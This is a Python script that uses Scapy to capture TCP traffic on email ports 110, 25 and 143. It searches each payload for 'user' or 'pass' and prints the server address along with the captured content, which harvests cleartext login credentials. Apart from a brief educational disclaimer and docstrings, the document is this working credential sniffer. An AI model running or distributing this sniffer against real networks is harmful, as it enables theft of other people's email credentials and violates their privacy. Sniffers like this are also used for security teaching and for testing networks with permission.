#!/usr/bin/env python3
"""
Email Credential Sniffer

This script uses Scapy to sniff network traffic for potential email credentials. It inspects
TCP packets on ports commonly used by email protocols (POP3 on 110, SMTP on 25, and IMAP on 143)
and searches for the keywords "user" or "pass" within the TCP payload. When a packet matching these
criteria is detected, the script prints the destination IP (assumed to be the email server) and
the payload content.

DISCLAIMER:
    Use this script for educational purposes only. Ensure you have explicit permission to
    monitor network traffic on the target network.

Author: Bharath (github.com/yamakira)
"""

from scapy.all import sniff, IP, TCP

def packet_callback(packet):
    """
    Callback function invoked for each captured packet.

    This function checks if the packet contains a TCP payload and then inspects that payload
    for the presence of the keywords "user" or "pass" (case-insensitive). If a match is found,
    it prints the destination IP address and the payload content.

    Parameters:
        packet: The network packet captured by Scapy's sniffer.
    """
    # Ensure the packet has a TCP layer and a non-empty payload.
    if packet.haslayer(TCP) and packet[TCP].payload:
        # Convert the TCP payload to a string.
        mail_packet = str(packet[TCP].payload)
        
        # Check if the payload contains the keywords "user" or "pass" (case-insensitive).
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)

def main():
    """
    Starts the packet sniffer with a specified filter.

    The sniffer listens for TCP traffic on ports 110, 25, or 143, which are commonly associated with
    email services. Each packet is passed to the 'packet_callback' function for inspection.
    """
    # Define a BPF (Berkeley Packet Filter) to capture TCP traffic on ports 110, 25, or 143.
    filter_str = "tcp port 110 or tcp port 25 or tcp port 143"
    
    # Start sniffing packets using the defined filter and callback function.
    sniff(filter=filter_str, prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
